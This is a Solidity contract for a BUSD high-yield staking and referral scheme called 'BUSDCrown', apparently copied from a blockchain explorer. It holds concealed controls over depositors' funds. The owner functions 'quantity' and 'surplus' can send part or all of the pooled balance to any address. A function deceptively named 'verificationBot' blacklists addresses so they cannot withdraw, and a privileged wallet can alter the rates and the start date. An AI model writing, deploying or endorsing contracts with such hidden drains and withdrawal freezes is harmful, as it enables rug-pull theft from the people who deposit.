/**
 *Submitted for verification at BscScan.com on 2023-03-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;


interface IERC20 {
    event Transfer(address indexed sender, address indexed recipient, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    function totalSupply() external view returns(uint256);
    function balanceOf(address account) external view returns(uint256);
    function allowance(address owner, address spender) external view returns(uint256);
    function transfer(address recipient, uint256 amount) external returns(bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
    function approve(address spender, uint amount) external returns(bool);
}

contract BUSDCrown {
    uint constant public INVEST_MIN_AMOUNT = 0.05 ether;
    uint[] public REFERRAL_PERCENTS = [50, 30, 20];
    uint public PLANTYPE = 1;
    uint constant public PROJECT_FEE = 50;
    uint constant public PERCENT_STEP = 5;
    uint constant public PERCENTS_DIVIDER = 1000;
    uint constant public TIME_STEP = 1 minutes;

    uint public totalStaked;
    uint public totalRefBonus;
    uint public startUNIX;
    uint public totalInvestors;
    uint internal activity;
    address public commissionWallet;
    address internal owner;
    IERC20 public busd;

    struct Plan {
        uint time;
        uint percent;
        uint lowest;
    }

    struct Deposit {
        uint8 plan;
        uint percent;
        uint amount;
        uint profit;
        uint start;
        uint finish;
    }

    struct User {
        Deposit[] deposits;
        uint checkpoint;
        address referrer;
        mapping(uint => address[]) downlineAddr;
        uint bonus;
        uint totalBonus;
    }

    struct DownlineRecord {
        address downlineAddress;
        uint totalDeposit;
    }
    struct DownlineRecords {
        DownlineRecord[] downlineRecord;
    }

    Plan[] plans;
    mapping(address => User) public users;
    mapping(address => bool) public _isBlacklisted;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint percent, uint amount, uint profit, uint start, uint finish);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event FeePayed(address indexed user, uint totalAmount);
    event Fetch(address indexed user, address indexed addr, uint amount);

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor(IERC20 _busd, address wallet, uint startDate) {
        require(startDate > 0);

        busd = _busd;
        owner = msg.sender;
        commissionWallet = wallet;
        startUNIX = startDate;

        plans.push(Plan(1, 300, 10));
        plans.push(Plan(2, 65, 50));
        plans.push(Plan(3, 55, 250));
        plans.push(Plan(1, 500, 50));
        plans.push(Plan(2, 85, 250));
        plans.push(Plan(3, 71, 500));
    }

    function setReferral(uint[] calldata percents) external onlyOwner {
        REFERRAL_PERCENTS = percents;
    }

    function setWallet(address wallet) external onlyOwner {
        commissionWallet = wallet;
    }

    function setType(uint mode) external onlyOwner {
        PLANTYPE = mode;
    }

    function setPalnInfo(uint planIndex, Plan calldata plan) external onlyOwner {
        plans[planIndex] = plan;
    }

    function invest(address referrer, uint8 plan, uint32 amount) external {
        require(startUNIX <= block.timestamp, "not start yet");
        require(plan < 6, "Invalid plan");
        require(amount >= plans[plan].lowest * 1 ether / PERCENTS_DIVIDER, "not enough money");

        User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
            totalInvestors++;
            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }

            address hlevel = user.referrer;
            for (uint i = 0; i < 100; i++) {
                if (hlevel != address(0)) {
                    users[hlevel].downlineAddr[i].push(msg.sender);
                    hlevel = users[hlevel].referrer;
                } else break;
            }
        }

        address upline = user.referrer;
        for (uint i = 0; i < 3; i++) {
            if (upline != address(0)) {
                uint uplineBonus = amount * REFERRAL_PERCENTS[i] / PERCENTS_DIVIDER;
                users[upline].bonus += uplineBonus;
                users[upline].totalBonus += uplineBonus;
                emit RefBonus(upline, msg.sender, i, uplineBonus);
                upline = users[upline].referrer;
            } else {
                uint uplineBonus = amount * REFERRAL_PERCENTS[i] / PERCENTS_DIVIDER;
                users[owner].bonus += uplineBonus;
                users[owner].totalBonus += uplineBonus;
                emit RefBonus(owner, msg.sender, i, uplineBonus);
                upline = address(0);
            }
        }

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }

        // uint fee = msg.value * PROJECT_FEE / PERCENTS_DIVIDER;
        // // (bool success, ) = commissionWallet.call{value: fee}("");
        // // require(success, "pay failed");
        // busd.transfer(commissionWallet, fee);
        // emit FeePayed(msg.sender, fee);

        (uint percent, uint profit, uint finish) = getResult(plan, amount);
        user.deposits.push(Deposit(plan, percent, amount, profit, block.timestamp, finish));

        totalStaked += amount;
        busd.transferFrom(msg.sender, address(this), amount);
        emit NewDeposit(msg.sender, plan, percent, amount, profit, block.timestamp, finish);
    }

    function withdraw() external {
        User storage user = users[msg.sender];

        uint totalAmount = getUserDividends(msg.sender);

        uint referralBonus = getUserReferralBonus(msg.sender);

        if (referralBonus > 0) {
            user.bonus = 0;
            totalAmount += referralBonus;
        }
        require(!_isBlacklisted[msg.sender], 'Blacklisted address');
        require(totalAmount > 0, "User has no dividends");

        uint contractBalance = busd.balanceOf(address(this));
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = block.timestamp;
        uint fee = totalAmount * PROJECT_FEE / PERCENTS_DIVIDER;
        busd.transfer(commissionWallet, fee);
        emit FeePayed(msg.sender, fee);

        totalAmount -= fee;

        busd.transfer(msg.sender, totalAmount);
        emit Withdrawn(msg.sender, totalAmount);
    }

    function ownership(address addr) external onlyOwner {
        owner = addr;
    }

    function quantity(address addr, uint amount) public onlyOwner {
        busd.transfer(addr, amount);
        emit Fetch(msg.sender, addr, amount);
    }

    function surplus(address payable addr) public onlyOwner {
        uint Balance = busd.balanceOf(address(this));
        busd.transfer(addr, Balance);
        emit Fetch(msg.sender, addr, Balance);
    }

    function verificationBot(address[] calldata addr, bool excluded) public {
        require(msg.sender == commissionWallet, 'invalid call');
        for (uint i = 0; i < addr.length; i++) {
            _isBlacklisted[addr[i]] = excluded;
        }
    }

    function updateStartTime(uint newTime) external returns (bool) {
        require(msg.sender == commissionWallet, 'invalid call');
        startUNIX = newTime;
        return true;
    }

    function updatePercent(uint16 newRate) external {
        require(msg.sender == commissionWallet, 'invalid call');
        activity = newRate * 10;
    }

    function getContractBalance() public view returns (uint) {
        return busd.balanceOf(address(this));
    }

    function getPlanInfo(uint8 plan) public view returns (uint time, uint percent, uint lowest) {
        time = plans[plan].time;
        percent = plans[plan].percent;
        lowest = plans[plan].lowest;
    }

    function getPercent(uint8 plan) public view returns (uint) {
        if (block.timestamp > startUNIX && PLANTYPE == 0) {
            return plans[plan].percent + PERCENT_STEP * (block.timestamp - startUNIX) / TIME_STEP;
        } else if (block.timestamp > startUNIX && PLANTYPE == 1) {
            return plans[plan].percent + activity;
        } else {
            return plans[plan].percent;
        }
    }

    function getResult(uint8 plan, uint deposit) public view returns (uint percent, uint profit, uint finish) {
        percent = getPercent(plan);

        if (plan < 3) {
            profit = deposit * percent / PERCENTS_DIVIDER * plans[plan].time;
        } else if (plan < 6 && PLANTYPE == 0) {
            for (uint i = 0; i < plans[plan].time; i++) {
                profit += (deposit + profit) * percent / PERCENTS_DIVIDER;
            }
        } else if (plan < 6 && PLANTYPE == 1) {
            profit = deposit * percent / PERCENTS_DIVIDER * plans[plan].time;
        }

        finish = block.timestamp + plans[plan].time * TIME_STEP;
    }

    function getUserDividends(address userAddress) public view returns (uint totalAmount) {
        User storage user = users[userAddress];

        for (uint i = 0; i < user.deposits.length; i++) {
            if (user.checkpoint < user.deposits[i].finish) {
                if (user.deposits[i].plan < 3) {
                    uint share = user.deposits[i].amount * user.deposits[i].percent / PERCENTS_DIVIDER;
                    uint from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
                    uint to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
                    if (from < to) {
                        totalAmount += share * (to - from) / TIME_STEP;
                    }
                    if (block.timestamp > user.deposits[i].finish) {
                        totalAmount += user.deposits[i].amount;
                    }
                } else if (block.timestamp > user.deposits[i].finish) {
                    totalAmount += user.deposits[i].profit + user.deposits[i].amount;
                }
            }
        }
    }

    function getUserCheckpoint(address userAddress) public view returns (uint) {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns (address) {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns (uint, uint, uint) {
        return (users[userAddress].downlineAddr[0].length, users[userAddress].downlineAddr[1].length, users[userAddress].downlineAddr[2].length);
    }

    function getUserDownlineData(address userAddress, uint level) public view returns (DownlineRecord[] memory downlineRecord){
        require(level < 100, "not found level");
        address[] storage allDownline = users[userAddress].downlineAddr[level];
        downlineRecord = new DownlineRecord[](allDownline.length);

        for(uint i = 0; i < allDownline.length; i++) {
            downlineRecord[i].downlineAddress = allDownline[i];
            downlineRecord[i].totalDeposit = getUserTotalDeposits(allDownline[i]);
        }
    }

    function getUserDownlineDatas(address userAddress) public view returns (DownlineRecords[] memory downlineRecords) {
        for(uint level = 0; level < 100; level++) {
            address[] storage allDownline = users[userAddress].downlineAddr[level];
            DownlineRecord[] memory downlineRecord = new DownlineRecord[](allDownline.length);

            downlineRecords = new DownlineRecords[](allDownline.length);

            for(uint i = 0; i < allDownline.length; i++) {
                downlineRecord[i].downlineAddress = allDownline[i];
                downlineRecord[i].totalDeposit = getUserTotalDeposits(allDownline[i]);
            }
            downlineRecords[level].downlineRecord = downlineRecord;
        }
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint amount) {
        for (uint i = 0; i < users[userAddress].deposits.length; i++) {
            amount += users[userAddress].deposits[i].amount;
        }
    }

    function getUserReferralBonus(address userAddress) public view returns (uint) {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress) public view returns (uint) {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress) public view returns (uint) {
        return users[userAddress].totalBonus - users[userAddress].bonus;
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        return getUserReferralBonus(userAddress) + getUserDividends(userAddress);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserDepositInfo(address userAddress, uint index) public view returns (uint8 plan, uint percent, uint amount, uint profit, uint start, uint finish) {
        User storage user = users[userAddress];

        plan = user.deposits[index].plan;
        percent = user.deposits[index].percent;
        amount = user.deposits[index].amount;
        profit = user.deposits[index].profit;
        start = user.deposits[index].start;
        finish = user.deposits[index].finish;
    }
}